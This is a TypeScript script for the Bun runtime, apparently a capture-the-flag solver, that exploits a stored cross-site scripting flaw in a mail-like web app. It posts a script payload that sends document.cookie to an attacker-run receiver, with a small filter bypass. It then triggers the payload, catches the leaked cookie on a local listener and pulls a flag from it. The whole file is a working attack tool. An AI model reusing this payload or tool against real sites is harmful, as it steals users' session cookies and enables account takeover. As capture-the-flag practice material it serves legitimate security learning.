#!/usr/bin/env -S bun run

interface Options {
    origin: string
    receiver: string
    listen_port: number
}

function print_usage() {
    console.info([
        `Usage: bun ${JSON.stringify(import.meta.file)} [options] <target>`,
        ``,
        `Arguments:`,
        `  <target>              The origin of the target server`,
        ``,
        `Options:`,
        `  --receiver, -r <origin>  The receiver origin`,
        `  --port, -p <port>        The listening port on local machine`,
        `  --help, -h               Show this help message`,
        ``,
        `Copyright (C) 2024 Cnily03`,
        `https://github.com/Cnily03`
    ].join('\n'))
}

function parse_options() {
    const opts: Partial<Options> = {}
    const args = process.argv.slice(2)
    const remains: string[] = []
    if (args.length === 0) {
        print_usage()
        process.exit(1)
    }
    const test_next = (next: string | undefined, opt?: string) => {
        if (typeof next === 'string' && next.length > 0 && !next.startsWith('-')) {
            return next
        }
        if (opt) {
            io.error('Missing value for option ' + opt)
            process.exit(1)
        }
        return undefined
    }
    while (args.length > 0) {
        const arg = args.shift()!
        if (arg === '--receiver' || arg === '-r') {
            opts.receiver = test_next(args?.[0])
            args.shift()
        } else if (arg === '--port' || arg === '-p') {
            opts.listen_port = parseInt(test_next(args?.[0]) || 'NaN')
            args.shift()
        } else if (arg === '--help' || arg === '-h') {
            print_usage()
            process.exit(0)
        } else if (arg.startsWith('-')) {
            io.error('Unknown option: ' + arg)
            process.exit(1)
        } else {
            remains.push(arg)
        }
    }
    if (remains.length > 0) {
        let o = remains[0].trim()
        opts.origin = /^https?:\/\//.test(o) ? o : `http://${o}`
    }
    // fallback check
    if (typeof opts.listen_port !== 'number' || !Number.isSafeInteger(opts.listen_port)) {
        opts.listen_port = 54100
    }
    if (opts.listen_port < 0 || opts.listen_port > 65535) {
        io.error('Invalid port number')
        process.exit(1)
    }
    if (typeof opts.receiver !== 'string') {
        opts.receiver = 'http://localhost:' + opts.listen_port
    }
    if (!/^https?:\/\//.test(opts.receiver)) {
        opts.receiver = `http://${opts.receiver}`
    }
    if (typeof opts.origin !== 'string') {
        io.error('Missing target origin')
        process.exit(1)
    }
    return opts as Options
}

const io = {
    error: (msg: string) => console.error('\x1b[31mError: \x1b[0m' + msg),
    prepare: (t: string, msg: string = '') => console.info(`\x1b[36m[ ] ${t}\x1b[0m` + (msg ? (' ' + msg + '\x1b[0m') : '')),
    success: (t: string, msg: string = '') => console.info(`\x1b[32m[+] ${t}\x1b[0m` + (msg ? (' ' + msg + '\x1b[0m') : '')),
    warn: (t: string, msg: string = '') => console.warn(`\x1b[33m[!] ${t}\x1b[0m` + (msg ? (' ' + msg + '\x1b[0m') : '')),
    fail: (t: string, msg: string = '') => console.warn(`\x1b[31m[-] ${t}\x1b[0m` + (msg ? (' ' + msg + '\x1b[0m') : '')),
    info: (t: string, msg: string = '') => console.info(`\x1b[34m[+] ${t}\x1b[0m` + (msg ? (' ' + msg + '\x1b[0m') : '')),
    dark_prepare: (t: string, msg: string = '') => console.info(`\x1b[36;2m[ ] ${t}\x1b[0;2m` + (msg ? (' ' + msg) : '') + '\x1b[0m'),
    dark_success: (t: string, msg: string = '') => console.info(`\x1b[32;2m[+] ${t}\x1b[0;2m` + (msg ? (' ' + msg) : '') + '\x1b[0m'),
    dark_warn: (t: string, msg: string = '') => console.warn(`\x1b[33;2m[!] ${t}\x1b[0;2m` + (msg ? (' ' + msg) : '') + '\x1b[0m'),
    dark_fail: (t: string, msg: string = '') => console.warn(`\x1b[31;2m[-] ${t}\x1b[0;2m` + (msg ? (' ' + msg) : '') + '\x1b[0m'),
    dark_info: (t: string, msg: string = '') => console.info(`\x1b[34;2m[+] ${t}\x1b[0;2m` + (msg ? (' ' + msg) : '') + '\x1b[0m'),
    $prev: () => process.stdout.write('\x1b[F\x1b[K'),
}

function random_string() {
    return Math.random().toString(36).substring(2)
}

async function listen_leak(port: number, sessid = '1') {
    return new Promise((resolve: (value: string) => void, reject) => {
        const server = Bun.serve({
            port: port,
            fetch: async (c) => {
                const u = new URL(c.url, 'http://localhost')
                if (c.method === 'POST' && u.searchParams.get('leak') === sessid) {
                    let body = await c.text()
                    clearInterval(timeout)
                    resolve(body)
                    server.stop()
                }
                c.headers.set('Access-Control-Allow-Origin', '*')
                return Response.json({}, { status: 200 })
            }
        })
        io.dark_info(`Start listening server on`, server.url.toString())
        let timeout = setTimeout(() => {
            server.stop()
            reject('Timeout, aborting...')
        }, 5 * 1000 + 2 * 1000)
    })
}

async function send_payload(target: string, receiver: string, sessid = '1') {
    const html = (strings: TemplateStringsArray, ...values: any[]) => { return strings.reduce((acc, str, i) => acc + str + (values[i] || ''), '') }
    const r = await fetch(`${target}/api/send`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json; charset=utf-8'
        },
        body: JSON.stringify({
            title: random_string(),
            content: html`<script>fetch('${receiver}?leak=${sessid}',{method:'POST',body:document.cookie,'no-cors':true})</script>`
                .replace(/\>/g, '\n>')
        })
    })
    if (r.status !== 200) { throw new Error(await r.text()) }
    return r.json().then((o: { id: string }) => o.id)
}

async function emit_payload(target: string, id: string) {
    const r = await fetch(`${target}/api/call`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json; charset=utf-8'
        },
        body: JSON.stringify({ id })
    })
    if (r.status !== 200) { throw new Error(await r.text()) }
    return true
}

async function main() {
    const opts = parse_options()
    io.dark_info('Target:', opts.origin)
    io.dark_info('Receiver:', opts.receiver)
    // send payload
    const SESSID = random_string()
    io.prepare('Sending payload')
    const id = await send_payload(opts.origin, opts.receiver, SESSID).catch(e => {
        io.$prev()
        io.fail('Failed to send payload:', e.message || e)
        process.exit(1)
    })
    io.$prev()
    io.dark_success('Payload sent')
    io.info('Mail ID:', id)
    // listen for leak
    const p = listen_leak(opts.listen_port, SESSID)
    await new Promise(r => setTimeout(r, 500))
    // emit payload
    io.prepare('Emitting payload')
    await emit_payload(opts.origin, id).catch(e => {
        io.$prev()
        io.fail('Failed to emit payload:', e.message || e)
        process.exit(1)
    })
    io.$prev()
    io.dark_success('Payload emitted')
    // wait for leak
    io.prepare('Waiting for leak...')
    const cookie = await p.catch(e => {
        io.$prev()
        io.fail(e.message || e)
        process.exit(1)
    })
    io.$prev()
    io.success('Leaked cookie:', cookie)
    // test flag
    const flag = cookie.match(/FLAG=([^}]+\})/)?.[1]
    if (flag) {
        io.info('\x1b[34;1mFLAG:', flag)
    } else {
        io.warn('No flag found')
    }
}

main()